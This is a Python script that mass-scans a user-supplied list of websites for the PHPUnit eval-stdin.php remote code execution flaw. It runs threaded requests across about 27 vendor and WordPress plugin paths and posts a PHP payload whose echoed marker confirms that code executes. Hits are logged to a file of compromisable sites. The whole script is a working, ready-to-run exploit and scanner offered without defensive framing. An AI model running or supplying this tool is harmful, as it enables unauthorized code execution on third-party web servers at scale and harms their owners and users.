from fake_useragent import UserAgent
import requests
import re
import sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

confVerify = True
confAllowRedirect = False
confTimeout = 15
confPayload = '<?php echo base64_decode("dHJ1c3RzZWMweDA3Nzc="); ?>'
confDebug = False

paths = [
    '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/server/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/plugins/contabileads/integracoes/mautic/api-library/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/themes/enfold-child/update_script/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/plugins/prh-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/plugins/realia/libraries/PayPal-PHP-SDK/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/wp-content/plugins/woocommerce-software-license-manager/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/sites/all/libraries/php-curl-class/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
]

def debug(url, err):
    if confDebug == True:
        if 'ConnectTimeout' in err:
            open('phpunit_ConnectTimeout.log', 'a').write(f'[ERR] {url} : {err}\n')
        elif 'ConnectionError' in err:
            open('phpunit_ConnectionError.log', 'a').write(f'[ERR] {url} : {err}\n')
        else:
            open('phpunit_dbug.log', 'a').write(f'[ERR] {url} : {err}\n')
    else:pass

def phpunit(url, path, confVerify, confAllowRedirect, confHeaders):
    if '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' not in path:
        url = url + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
    else:
        url = url
    
    try:
        if 'trustsec0x0777' in requests.get(url + path, headers=confHeaders, timeout=confTimeout, data=confPayload, allow_redirects=confAllowRedirect, verify=confVerify).text:
            open('phpunit.txt', 'a').write('[GET] '+ url + path + '\n')
            print(f' [ PHPUNIT ] {url}')
            return True
        else:pass
        
        if 'trustsec0x0777' in requests.post(url + path, headers=confHeaders, timeout=confTimeout, data=confPayload, allow_redirects=confAllowRedirect, verify=confVerify).text:
            open('phpunit.txt', 'a').write('[POST] '+ url + path + '\n')
            print(f' [ PHPUNIT ] {url}')
            return True
        else:pass
        
        if 'trustsec0x0777' in requests.head(url + path, headers=confHeaders, timeout=confTimeout, data=confPayload, allow_redirects=confAllowRedirect, verify=confVerify).text:
            open('phpunit.txt', 'a').write('[HEAD] '+ url + path + '\n')
            print(f' [ PHPUNIT ] {url}')
            return True
        else:pass
        
        if 'trustsec0x0777' in requests.put(url + path, headers=confHeaders, timeout=confTimeout, data=confPayload, allow_redirects=confAllowRedirect, verify=confVerify).text:
            open('phpunit.txt', 'a').write('[PUT] '+ url + path + '\n')
            print(f' [ PHPUNIT ] {url}')
            return True
        else:pass
        
        return False
        
    except Exception as err:
        debug(url, str(err))
    
def exploit(url):
    if 'http://' not in url:
        url = 'http://'+ url
    else:
        url = url
    
    try:
        UserAgent = UserAgent().chrome
    except:
        UserAgent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'
    
    confHeaders = {
        "User-Agent": str(UserAgent),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": str(url),
        "Origin": str(url)
    }
    
    try:
        print (f'[!] PHPUnit Check : {url}')
        for path in paths:
            if path == '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php':
                if phpunit(url, path, confVerify, confAllowRedirect, confHeaders):
                    break
                else:pass
            else:
                path = path.replace('src/Util/PHP/eval-stdin.php', 'build.xml')
                check = requests.get(url + path, headers=confHeaders, timeout=confTimeout)
                if 'taskname="phpunit"' in str(check.content) or 'taskname="phpunit"' in str(check.text):
                    path = path.replace('build.xml', 'src/Util/PHP/eval-stdin.php')
                    open('phpunit_paths.txt', 'a').write(url + path +'\n')
                    testunit = phpunit(url, path, confVerify, confAllowRedirect, confHeaders)
                    if testunit:
                        break
                else:pass
                
    except Exception as err:
        debug(url, str(err))
        
     

def init():
    sitelist = input(" Sitelist : ")
    thread = input(" Thread : ")
    if sitelist == "":
        print("[!] Put Sitelist!")
        init()
    else:
        try:
            sites = open(sitelist, "r").read().splitlines()
            try:
                pp = Pool(int(thread))
                pp.map(exploit, sites)
            except:
                pass
        except:
            print("[!] Sitelist not found!")
            sys.exit()

init()
